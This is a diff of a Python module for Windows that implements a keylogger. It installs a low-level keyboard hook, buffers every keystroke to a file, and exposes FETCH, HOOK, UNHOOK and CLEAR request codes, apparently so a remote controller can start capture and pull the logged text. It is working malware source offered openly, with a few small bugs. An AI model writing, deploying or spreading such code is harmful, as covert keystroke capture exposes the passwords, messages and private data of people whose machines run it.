@@ -1,79 +1,141 @@
 import ctypes
-from ctypes import windll,byref,c_int,c_void_p, POINTER, CFUNCTYPE
-from ctypes.wintypes import WPARAM, LPARAM, MSG, DWORD
+from ctypes import windll, byref, c_int, c_void_p, POINTER, CFUNCTYPE
+from ctypes import wintypes
 import threading
+import os
+from pathlib import Path
 
 from handler_state import HandlerState
 from vkcode import VK_CODE, VK_SHIFT, VK_CAPS_LOCK, NormalChar
 
-
-user32 = windll.user32
-
 WH_KEYBOARD_LL = 13
 WM_KEYDOWN = 0x0100
+WM_QUIT = 0x0012
+INFINITE = 0xFFFFFFFF 
 
-msg = MSG()
-hook = None
-file = None
-stopEvent = threading.Event()
+class Logger:
+    MAX_BUFFER_LENGTH = 256
+    FILE = None
+    FILE_PATH = None
+    tempBuffer = ""
+
+    @staticmethod
+    def Init(filepath):
+        Logger.FILE_PATH = filepath
+        Logger.FILE = open(Logger.FILE_PATH, "w+")
+        Logger.FILE.close()
+        Logger.FILE = open(Logger.FILE_PATH, "a+")
+
+    @staticmethod
+    def Del():
+        Logger.FILE.close()
+        Logger.tempBuffer = ""
+
+    
+    @staticmethod
+    def Log(vkCode, isCapitalized):
+        # Xu lyz
+        to_write = ""
+        char = VK_CODE[vkCode]
+        if char != 'UKN' and vkCode != VK_CAPS_LOCK and vkCode not in VK_SHIFT:
+            if type(char) != tuple:
+                to_write = char
+            else:
+                to_write = char[1] if isCapitalized else char[0]
+
+            if not NormalChar(vkCode):
+                to_write = '<' + to_write + '>'
+
+        Logger.tempBuffer += to_write
+        if len(Logger.tempBuffer) >= Logger.MAX_BUFFER_LENGTH:
+            Logger.DumpBuffer()
+
+    @staticmethod
+    def DumpBuffer():
+        Logger.FILE.write(Logger.tempBuffer)
+        Logger.tempBuffer = ""
+
+    @staticmethod
+    def Read():
+        Logger.FILE.close()
+        Logger.FILE = open(Logger.FILE_PATH, "r")
+        content = Logger.FILE.read()
+        content += Logger.tempBuffer
+        Logger.FILE.close()
+        Logger.FILE = open(Logger.FILE_PATH, "a+")
+        return content
+
+    @staticmethod
+    def Clear():
+        Logger.FILE.close()
+        Logger.FILE = open(Logger.FILE_PATH, "w+")
+        Logger.FILE.close()
+        Logger.FILE = open(Logger.FILE_PATH, "a+")
+        Logger.tempBuffer = ""
+        pass
+
+threadID = wintypes.DWORD()
 
 class KBDLLHOOKSTRUCT(ctypes.Structure):
-    _fields_ = [("vkCode", DWORD),
-                ("scanCode", DWORD),
-                ("flags", DWORD),
-                ("time", DWORD),
-                ("dwExtraInfo", DWORD)]  
+    _fields_ = [("vkCode", wintypes.DWORD),
+                ("scanCode", wintypes.DWORD),
+                ("flags", wintypes.DWORD),
+                ("time", wintypes.DWORD),
+                ("dwExtraInfo", wintypes.DWORD)]  
 
-LLKP_decl = CFUNCTYPE(c_int, c_int, WPARAM, POINTER(KBDLLHOOKSTRUCT))
+LLKP_decl = CFUNCTYPE(c_int, c_int, wintypes.WPARAM, POINTER(KBDLLHOOKSTRUCT))
+LPTHREAD_START_ROUTINE = ctypes.WINFUNCTYPE(wintypes.DWORD, wintypes.LPVOID)
 
 def LowLevelKeyboardProc(nCode, wParam, lParam):
     global file, stop
+
+    if (nCode < 0):
+        return windll.user32.CallNextHookEx(hook, nCode, wParam, lParam)
+
     if wParam == WM_KEYDOWN:
         #Check for SHIFT or CAPSLOCK
-        shifted = any([user32.GetAsyncKeyState(x) & 0x8000 for x in VK_SHIFT])
-        capslocked = user32.GetAsyncKeyState(VK_CAPS_LOCK) & 0x8000
-
+        shifted = any([windll.user32.GetAsyncKeyState(x) & 0x8000 for x in VK_SHIFT])
+        capslocked = windll.user32.GetAsyncKeyState(VK_CAPS_LOCK) & 0x8000
         vkCode = lParam.contents.vkCode
-        to_write = VK_CODE[vkCode]
+        
+        Logger.Log(vkCode, shifted or capslocked)
 
-        if type(to_write) == tuple:
-            if shifted or capslocked:
-                to_write = to_write[1]
-            else:
-                to_write = to_write[0]
+    return windll.user32.CallNextHookEx(hook, nCode, wParam, lParam)
 
-        if not NormalChar(vkCode):
-            to_write = ' ' + to_write + ' '
-        if file:
-            file.write(to_write)
+def InstallHookAndLoop(lpParameter):
+    global hook
     
-    return user32.CallNextHookEx(hook, nCode, wParam, lParam)
-
-
-def Record():
-    global hook, stopEvent
     callback = LLKP_decl(LowLevelKeyboardProc)
-    hook = user32.SetWindowsHookExA(WH_KEYBOARD_LL, callback, 0,0)
-    while not stopEvent.is_set():
-        pass
-    # while user32.GetMessageA(ctypes.byref(msg),None, 0,0):
-    #     pass
 
-def RecordWrapper():
-    a = threading.Thread(target = Record)
-    return a
+    hook = windll.user32.SetWindowsHookExA(WH_KEYBOARD_LL, callback, 0,0)
+
+    msg = wintypes.MSG()
+    while windll.user32.GetMessageA(ctypes.byref(msg),None, 0,0):
+        if (msg.message == WM_QUIT):
+            windll.user32.UnhookWindowHookEx(hook)
+
+        windll.user32.TranslateMessage(ctypes.byref(msg))
+        windll.user32.DispatchMessage(ctypes.byref(msg))
+
+    windll.user32.UnhookWindowsHookEx(hook)
+    print('aa')
+    return 200
+
+def StartThread(function):
+    func = LPTHREAD_START_ROUTINE(function)
+    handle = wintypes.HANDLE(windll.kernel32.CreateThread(None, 0, func, wintypes.LPVOID(0), 0, ctypes.byref(threadID)))
+
+    if handle:
+        windll.kernel32.WaitForSingleObject(handle, 1)
+
+    return handle
 
 class KeystrokeHandler:
     def __init__(self, filepath):
-        global file
-        self.filepath = filepath
-        self.thread = None
+        global globalFile
+        self.threadHandle = None
         self.hooked = False
-
-        #Make sure file exists
-        file = open(self.filepath, "w+")
-        file.close()
-        file = None
+        Logger.Init(filepath)
         pass
 
     def Execute(self, reqCode:str, data:str):
@@ -82,25 +144,13 @@ class KeystrokeHandler:
             extraData = ""
             if reqCode == "FETCH":
                 assert self.hooked, "Hook has not been installed"
-
-                file.close()
-                file = open(self.filepath, "r")
-                extraData = file.read()
-
-                file.close()
-                file = open(self.filepath, "a+")
+                extraData = Logger.Read()
             elif reqCode == "HOOK":
                 self.Hook()
-                pass
             elif reqCode == "UNHOOK":
                 self.Unhook()
-                pass
             elif reqCode == "CLEAR":
-                if file:
-                    file.close()
-                    file = open(self.filepath, "w")
-                    file.close()
-                    file = open(self.filepath, "a+")
+                Logger.Clear()
             else:
                 return HandlerState.INVALID, None
 
@@ -111,40 +161,27 @@ class KeystrokeHandler:
             return HandlerState.FAILED, None
 
     def Hook(self):
-        global file, stopEvent
-
-        #Open file in append mode
-        assert not self.hooked, "Hook is already installed"
-
-        file = open(self.filepath, "a+")
-        self.thread = RecordWrapper()
-        self.thread.start()
+        self.threadHandle = StartThread(InstallHookAndLoop)
         self.hooked = True
-        stopEvent.clear()
 
     def Unhook(self):
-        global file, stopEvent
-        
-        assert self.hooked, "Hook is not installed"
-        
-        if file:
-            file.close()
-            file = None
-        self.hooked = False
-        stopEvent.set()
-        self.thread.join()
+        global threadID
+        if (windll.user32.PostThreadMessageA(threadID, WM_QUIT, None, None)):
+            threadID = wintypes.DWORD()
+            self.hooked = False
+        else:
+            raise OSError("Quit message is not posted")
 
     def __del(self):
         self.Unhook()
+        Logger.Del()
         pass
-
 
 if __name__ == "__main__":
     from pathlib import Path
     import os
     import time
-    a = KeystrokeHandler(os.path.join(Path(__file__).parent.absolute(),"temp\\logged_key.txt"))
-    a.Hook()
-    m = input("a:")
-    ctypes.windll.user32.PostQuitMessage(0)
-    a.Unhook()
+    a = KeystrokeHandler()
+    handle = StartThread(InstallHookAndLoop)
+    input("b: ")
+    print(Logger.Read())
